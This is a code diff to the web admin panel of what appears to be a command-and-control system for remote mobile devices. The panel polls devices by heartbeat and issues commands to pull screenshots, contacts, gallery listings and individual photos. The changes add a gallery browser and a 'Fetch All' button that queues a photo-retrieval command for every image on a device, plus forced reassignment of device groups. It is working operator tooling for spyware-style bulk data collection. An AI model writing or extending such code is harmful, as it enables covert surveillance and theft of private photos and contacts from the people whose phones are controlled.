@@ -593,7 +593,8 @@ async function loadC2Uploads(id){
   if(!list.length){ el.innerHTML='<div style="color:#9ca3af;padding:12px">No uploads yet. Wait for heartbeat (up to 60s) then refresh.</div>'; return; }
   el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">'+list.length+' entries</div>' +
     list.map((u,i)=>{
-      const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.type==='gallery_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+      if(u.type==='gallery_photo') return '';
+      const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
       const isGallery = u.type==='get_gallery';
       const isContacts = u.type==='get_contacts';
       const isText = u.filename.endsWith('.txt');
@@ -619,7 +620,8 @@ async function loadC2Uploads(id){
       return `<div id="upload_${i}" style="margin-bottom:8px;padding:8px;background:#f8fafc;border-radius:6px">${hdr}</div>`;
     }).join('');
   list.forEach(async (u,i)=>{
-    const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.type==='gallery_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+    if(u.type==='gallery_photo') return;
+    const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
     const isGallery = u.type==='get_gallery';
     const isContacts = u.type==='get_contacts';
     const isSwitch = u.type==='switch_toggle';
@@ -642,15 +644,11 @@ async function loadC2Uploads(id){
         try {
           const arr = JSON.parse(text);
           if(arr[0] && arr[0].error){ el2.innerHTML='<span style="color:#dc2626">Error: '+esc(arr[0].error)+'</span>'; return; }
-          el2.innerHTML = '<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px"><span style="color:#374151;font-size:12px">'+arr.length+' images</span><button onclick="c2CmdGetGalleryBatch('+id+','+JSON.stringify(arr.slice(0,20).map(f=>String(f.id)))+')" style="background:#059669;color:#fff;border:0;border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer">&#128229; Fetch first 20</button></div>'+
-            '<table style="width:100%;font-size:12px;border-collapse:collapse">'+
-            '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">Filename</th><th style="padding:4px 8px;text-align:right">Size</th><th style="padding:4px 8px;text-align:right">Date</th><th style="padding:4px 8px;text-align:center">Actions</th></tr></thead>'+
-            '<tbody>'+arr.slice(0,200).map(f=>{
-              const d = f.date ? new Date(f.date*1000).toLocaleDateString('en-US') : '';
-              const sz = f.size>1048576 ? (f.size/1048576).toFixed(1)+'MB' : f.size>1024 ? (f.size/1024).toFixed(0)+'KB' : (f.size||0)+'B';
-              const fid = String(f.id || '');
-              return `<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.name||'')}">${esc(f.name||'')}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${sz}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${d}</td><td style="padding:3px 8px;text-align:center"><button onclick="c2CmdGetPhoto(${fid})" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:3px;padding:2px 8px;font-size:11px;cursor:pointer">&#128444; View</button></td></tr>`;
-            }).join('')+'</tbody></table>'+(arr.length>200?'<div style="color:#6b7280;font-size:11px;margin-top:4px">...showing first 200</div>':'');
+          const ck = 'gc_'+id+'_'+i;
+          galleryDataCache[ck] = {deviceId: id, arr};
+          el2.innerHTML = '<div style="display:flex;align-items:center;gap:10px">'+
+            '<span style="color:#374151;font-size:13px;font-weight:500">'+arr.length+' photos</span>'+
+            '<button onclick="openGalleryFromCache(\''+ck+'\')" style="background:#2563eb;color:#fff;border:0;border-radius:6px;padding:6px 16px;font-size:12px;cursor:pointer">&#128247; Browse Gallery</button></div>';
         } catch(pe){ el2.innerHTML='<pre style="font-size:12px;color:#111;white-space:pre-wrap">'+esc(text.slice(0,1000))+'</pre>'; }
       } else if(isContacts){
         const text = await res.text();
@@ -669,8 +667,9 @@ async function loadC2Uploads(id){
         const text = await res.text();
         const el2 = document.getElementById('usw_'+i);
         if(!el2) return;
-        const isOn = /sw\[[^\]]+\]on$/.test(text.trim());
-        const isErr = /sw\[[^\]]+\]err:/.test(text) || text.includes('error');
+        const t2 = text.trim();
+        const isOn = /sw\[[^\]]+\]on$/.test(t2) || /开关\[[^\]]+\]开$/.test(t2);
+        const isErr = /sw\[[^\]]+\]err:/.test(t2) || t2.includes('error') || t2.includes('失败');
         const bg = isErr ? '#fef2f2' : (isOn ? '#f0fdf4' : '#f8fafc');
         const border = isErr ? '#fecaca' : (isOn ? '#bbf7d0' : '#d1d5db');
         const color = isErr ? '#dc2626' : '#166534';
@@ -832,8 +831,8 @@ async function saveGroup(id){
   toast('Saved');
 }
 async function deleteGroup(id){
-  if(!confirm('Delete this group? Must have no devices assigned.')) return;
-  const r = await api(`/admin/api/groups/${id}`,{method:'DELETE'});
+  if(!confirm('Delete this group? Devices in this group will be moved to "no group".')) return;
+  const r = await api(`/admin/api/groups/${id}?force=true`,{method:'DELETE'});
   if(!r.ok){ alert(r.message||'Delete failed'); return; }
   loadGroups();
 }
@@ -1079,31 +1078,50 @@ async function loadMonitor() {
   loadMonitorLogs();
 }
 
+let monitorGalleryGroups = {};
 function renderMonitorUploads() {
   const filter = document.getElementById('monitorTypeFilter').value;
-  const uploads = monitorAllUploads.filter(u => !filter || u.type === filter);
-  if (uploads.length === 0) {
-    document.getElementById('monitorUploads').innerHTML = '<div style="color:#9ca3af;font-size:13px">No uploads</div>';
+  monitorGalleryGroups = {};
+  const nonGallery = [];
+  for(const u of monitorAllUploads){
+    if(u.type==='gallery_photo'){
+      const k = String(u.device_id||0);
+      if(!monitorGalleryGroups[k]) monitorGalleryGroups[k]={device_id:u.device_id,device_name:u.device_name,items:[]};
+      monitorGalleryGroups[k].items.push(u);
+    } else { nonGallery.push(u); }
+  }
+  const rows = [];
+  if(!filter || filter==='gallery_photo'){
+    Object.entries(monitorGalleryGroups).forEach(([k,g])=>{
+      const dev = esc(g.device_name||String(g.device_id));
+      rows.push('<tr><td>'+dev+'</td><td><span style="background:#dbeafe;color:#1d4ed8;padding:2px 6px;border-radius:4px;font-size:11px">gallery_photo</span></td>'+
+        '<td style="font-size:11px;color:#6b7280">'+g.items.length+' photos</td><td>-</td>'+
+        '<td>'+fmt(g.items[0].created_at)+'</td>'+
+        '<td><button class="small copy" onclick="openMonitorGalleryKey(\''+k+'\')">&#128247; Browse</button></td></tr>');
+    });
+  }
+  if(filter!=='gallery_photo'){
+    const filtered = filter ? nonGallery.filter(u=>u.type===filter) : nonGallery;
+    filtered.forEach(u=>{
+      const fn = esc(u.filename);
+      const isImg = u.type==='get_photo'||/\.(png|jpe?g|gif|webp)$/i.test(u.filename);
+      const preview = isImg
+        ? '<button class="small copy" onclick="viewMonitorImage(\'/admin/api/uploads/'+fn+'\')">Preview</button>'
+        : '<button class="small copy" onclick="viewMonitorText(\'/admin/api/uploads/'+fn+'\',\''+esc(u.type||'')+'\')">View</button>';
+      rows.push('<tr><td>'+esc(u.device_name||u.device_id)+'</td><td>'+esc(u.type)+'</td>'+
+        '<td style="font-size:11px;font-family:monospace">'+fn+'</td>'+
+        '<td>'+(u.size?(u.size/1024).toFixed(1)+'KB':'-')+'</td>'+
+        '<td>'+fmt(u.created_at)+'</td>'+
+        '<td>'+preview+'</td></tr>');
+    });
+  }
+  if(!rows.length){
+    document.getElementById('monitorUploads').innerHTML='<div style="color:#9ca3af;font-size:13px">No uploads</div>';
     return;
   }
-  document.getElementById('monitorUploads').innerHTML = `<table><thead><tr><th>Device</th><th>Type</th><th>Filename</th><th>Size</th><th>Time</th><th>Actions</th></tr></thead><tbody>` +
-    uploads.map(u => {
-      const fn = esc(u.filename);
-      const isImg = u.type==='get_photo' || /\.(png|jpe?g|gif|webp)$/i.test(u.filename);
-      const preview = isImg
-        ? `<button class="small copy" onclick="viewMonitorImage('/admin/api/uploads/${fn}')">Preview</button>`
-        : `<button class="small copy" onclick="viewMonitorText('/admin/api/uploads/${fn}','${esc(u.type||'')}')">View</button>`;
-      return `<tr>
-        <td>${esc(u.device_name || u.device_id)}</td>
-        <td>${esc(u.type)}</td>
-        <td style="font-size:11px;font-family:monospace">${fn}</td>
-        <td>${u.size ? (u.size/1024).toFixed(1)+'KB' : '-'}</td>
-        <td>${fmt(u.created_at)}</td>
-        <td>${preview}</td>
-      </tr>`;
-    }).join('') +
-    `</tbody></table>`;
+  document.getElementById('monitorUploads').innerHTML='<table><thead><tr><th>Device</th><th>Type</th><th>Filename</th><th>Size</th><th>Time</th><th>Actions</th></tr></thead><tbody>'+rows.join('')+'</tbody></table>';
 }
+function openMonitorGalleryKey(k){ const g=monitorGalleryGroups[k]; if(g) openMonitorGallery(g.device_id,g.items); }
 
 async function loadMonitorLogs() {
   const el = document.getElementById('monitorLogs');
@@ -1205,6 +1223,146 @@ function toast(msg){
   clearTimeout(toastTimer);
   toastTimer = setTimeout(()=>el.style.opacity='0', 1600);
 }
+
+// ---- gallery modal ----
+const galleryDataCache = {};
+let galleryModalPhotoArr = null;
+let galleryModalDeviceId = null;
+
+function openGalleryFromCache(ck){
+  const d = galleryDataCache[ck];
+  if(d) openGalleryFromC2(d.deviceId, d.arr);
+}
+function openGalleryFromC2(deviceId, arr){
+  galleryModalDeviceId = deviceId;
+  galleryModalPhotoArr = arr;
+  document.getElementById('galleryModalTitle').textContent = 'Device '+deviceId+' Gallery';
+  document.getElementById('galleryModalCount').textContent = arr.length+' photos';
+  document.getElementById('galleryFetchAllBtn').style.display = 'inline-block';
+  const grid = document.getElementById('galleryModalGrid');
+  grid.innerHTML = arr.map((f,idx)=>{
+    const fname = esc(f.name||String(f.id||''));
+    const fid = String(f.id||'');
+    const sz = f.size>1048576?(f.size/1048576).toFixed(1)+'MB':f.size>1024?Math.round(f.size/1024)+'KB':(f.size||0)+'B';
+    const dt = f.date ? new Date(f.date*1000).toLocaleDateString() : '';
+    return '<div style="border:1px solid #e5e7eb;border-radius:6px;overflow:hidden;background:#f8fafc;cursor:pointer" title="'+fname+'" onclick="gallerySendFetch(\''+fid+'\','+deviceId+')">'+
+      '<div id="gtile_'+deviceId+'_'+idx+'" style="width:100%;height:110px;background:#e5e7eb;display:flex;align-items:center;justify-content:center;font-size:36px;color:#9ca3af">&#128247;</div>'+
+      '<div style="padding:4px 6px;font-size:10px;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+fname+'</div>'+
+      '<div style="padding:0 6px 4px;font-size:10px;color:#9ca3af">'+sz+(dt?' · '+dt:'')+'</div>'+
+      '</div>';
+  }).join('');
+  document.getElementById('galleryModal').style.display='block';
+  loadGalleryThumbsFromUploads(deviceId, arr);
+}
+async function loadGalleryThumbsFromUploads(deviceId, arr){
+  try {
+    const data = await api('/admin/api/devices/'+deviceId+'/uploads');
+    const byId = {};
+    for(const u of (data.uploads||[])){
+      if(u.type!=='gallery_photo') continue;
+      const m = u.filename.match(/_gallery_photo_(\d+)\./);
+      if(m) byId[m[1]] = u.filename;
+    }
+    arr.forEach((f,idx)=>{
+      const fid = String(f.id||'');
+      if(!byId[fid]) return;
+      const tile = document.getElementById('gtile_'+deviceId+'_'+idx);
+      if(!tile) return;
+      fetch('/admin/api/uploads/'+byId[fid],{headers:{'Authorization':'Bearer '+token}})
+        .then(r=>r.blob()).then(b=>{
+          const url = URL.createObjectURL(b);
+          tile.innerHTML='';
+          tile.style.cssText='width:100%;height:110px;background:#000;overflow:hidden';
+          const img = document.createElement('img');
+          img.src=url; img.style.cssText='width:100%;height:100%;object-fit:cover';
+          img.onclick=e=>{e.stopPropagation();openGalleryLightbox(url);};
+          tile.parentElement.onclick=()=>openGalleryLightbox(url);
+          tile.appendChild(img);
+        }).catch(()=>{});
+    });
+  } catch(e){}
+}
+function openMonitorGallery(deviceId, uploads){
+  galleryModalDeviceId = deviceId;
+  galleryModalPhotoArr = null;
+  document.getElementById('galleryModalTitle').textContent = 'Device '+deviceId+' Gallery';
+  document.getElementById('galleryModalCount').textContent = uploads.length+' photos';
+  document.getElementById('galleryFetchAllBtn').style.display='none';
+  const grid = document.getElementById('galleryModalGrid');
+  grid.innerHTML = uploads.map((u)=>{
+    const fn = esc(u.filename);
+    const url = '/admin/api/uploads/'+fn;
+    return '<div style="border:1px solid #e5e7eb;border-radius:6px;overflow:hidden;background:#f8fafc;cursor:pointer" onclick="openGalleryLightboxAuth(\''+url+'\')">'+
+      '<img data-src="'+url+'" class="glazy-thumb" style="width:100%;height:110px;object-fit:cover;background:#e5e7eb;display:block">'+
+      '<div style="padding:4px 6px 4px;font-size:10px;color:#9ca3af">'+fmt(u.created_at)+'</div>'+
+      '</div>';
+  }).join('');
+  document.getElementById('galleryModal').style.display='block';
+  lazyLoadGalleryThumbs();
+}
+function lazyLoadGalleryThumbs(){
+  const imgs = document.querySelectorAll('#galleryModalGrid img.glazy-thumb');
+  if(!imgs.length) return;
+  const root = document.getElementById('galleryModalGrid');
+  const obs = new IntersectionObserver(entries=>{
+    entries.forEach(e=>{
+      if(!e.isIntersecting||e.target._loaded) return;
+      e.target._loaded=true; obs.unobserve(e.target);
+      fetch(e.target.dataset.src,{headers:{'Authorization':'Bearer '+token}})
+        .then(r=>r.blob()).then(b=>{e.target.src=URL.createObjectURL(b);}).catch(()=>{});
+    });
+  },{root,rootMargin:'60px'});
+  imgs.forEach(img=>obs.observe(img));
+}
+function closeGalleryModal(){
+  document.getElementById('galleryModal').style.display='none';
+  galleryModalDeviceId=null; galleryModalPhotoArr=null;
+}
+function openGalleryLightbox(blobUrl){
+  const lb=document.getElementById('galleryLightbox');
+  document.getElementById('galleryLightboxImg').src=blobUrl;
+  lb.style.display='flex';
+}
+async function openGalleryLightboxAuth(url){
+  try{ const b=await fetch(url,{headers:{'Authorization':'Bearer '+token}}).then(r=>r.blob()); openGalleryLightbox(URL.createObjectURL(b)); }catch(e){}
+}
+function closeGalleryLightbox(){ document.getElementById('galleryLightbox').style.display='none'; }
+async function gallerySendFetch(photoId, deviceId){
+  const r=await api('/admin/api/devices/'+deviceId+'/command',{method:'POST',body:JSON.stringify({type:'get_photo',payload:{id:String(photoId)}})});
+  r.ok?toast('Photo fetch issued — refresh after heartbeat'):alert(r.message||'Failed');
+}
+async function galleryFetchAll(){
+  if(!galleryModalPhotoArr) return;
+  const deviceId=galleryModalDeviceId||c2ActiveDeviceId;
+  if(!deviceId) return;
+  if(!confirm('Fetch all '+galleryModalPhotoArr.length+' photos? Commands will be queued.')) return;
+  let ok=0;
+  for(const f of galleryModalPhotoArr){
+    const r=await api('/admin/api/devices/'+deviceId+'/command',{method:'POST',body:JSON.stringify({type:'get_photo',payload:{id:String(f.id||'')}})});
+    if(r.ok) ok++;
+  }
+  toast('Issued '+ok+'/'+galleryModalPhotoArr.length+' photo commands — refresh after heartbeat');
+}
 </script>
-</body>
+
+<!-- Gallery Modal -->
+<div id="galleryModal" onclick="if(event.target===this)closeGalleryModal()" style="display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.78);overflow:auto;padding:30px 12px">
+  <div style="max-width:940px;margin:0 auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)">
+    <div style="padding:14px 18px;border-bottom:1px solid #e5e7eb;display:flex;justify-content:space-between;align-items:center">
+      <div>
+        <b id="galleryModalTitle" style="font-size:15px">Gallery</b>
+        <span id="galleryModalCount" style="color:#6b7280;font-size:12px;margin-left:8px"></span>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button id="galleryFetchAllBtn" onclick="galleryFetchAll()" style="background:#059669;color:#fff;border:0;border-radius:6px;padding:6px 14px;font-size:12px;cursor:pointer">&#128229; Fetch All</button>
+        <button onclick="closeGalleryModal()" style="background:#e5e7eb;border:0;border-radius:6px;padding:6px 14px;font-size:15px;cursor:pointer;line-height:1">&times;</button>
+      </div>
+    </div>
+    <div id="galleryModalGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;padding:16px;max-height:72vh;overflow-y:auto"></div>
+  </div>
+</div>
+<!-- Lightbox -->
+<div id="galleryLightbox" onclick="closeGalleryLightbox()" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.92);align-items:center;justify-content:center;cursor:zoom-out">
+  <img id="galleryLightboxImg" style="max-width:95vw;max-height:95vh;object-fit:contain;border-radius:4px">
+</div>
 </html>
